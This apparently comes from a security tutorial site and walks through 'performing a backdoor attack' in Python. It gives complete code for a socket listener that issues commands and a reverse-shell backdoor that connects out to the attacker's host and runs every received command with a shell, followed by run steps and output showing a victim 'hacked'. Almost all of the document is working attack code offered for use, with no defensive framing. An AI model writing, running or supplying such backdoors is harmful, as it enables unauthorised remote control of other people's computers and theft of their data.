---
tags: security-tutorials
---

# Performing a backdoor attack

**In this short demo you will:** 
- Comprehend on how to perform a backdoor attack

## Creating the hacker’s tool
This tool will allow us to send commands to the victim and to receive the outputs. To build this tool, we will use the socket API by creating a socket server that sends and receives data:

**server.<span>py**
```
import socket


my_ip = '192.168.10.1'
port = 4444
server = socket.socket()
server.bind((my_ip, port))
print('[+] Server Started')
print('[+] Listening For Victim')
server.listen(1)
victim, victim_addr = server.accept()
print(f'[+] {victim_addr} Victim opened the backdoor')

while True:
    command = input('Enter Command : ')
    command = command.encode()
    victim.send(command)
    print('[+] Command sent')
    output = victim.recv(1024)
    output = output.decode()
    print(f"Output: {output}")
```

The hacker’s tool is ready, but obviously, it won’t work without the backdoor.


## Creating the backdoor
The backdoor is gonna connect our computer to the victim’s one. After that, it is going to receive the commands from the hacker’s tool, execute them, and send the output back to us.


**backdoor.<span>py**
```
import socket
import subprocess


server_ip = '192.168.10.1'
port = 4444
backdoor = socket.socket()
backdoor.connect((server_ip, port))


while True:
    command = backdoor.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    backdoor.send(output + output_error)
```

## Testing

Done! Now we need to test what we have created:
- Open your terminal (UNIX) or command prompt (Windows) and run the hacker’s tool (server) with: `python server.py`
- Run the backdoor on the victim’s computer: `python backdoor.py`

On the hacker’s computer terminal you should see the following:

```
~$ python server.py 
[+] Server Started
[+] Listening For Victim
[+] ('192.168.10.105', 36684) Victim opened the backdoor
Enter Command : 
```

Now by entering the bash commands in the Enter Command input field, you will see the outputs displayed on your terminal, from which we can conclude that we have hacked the victim’s computer.
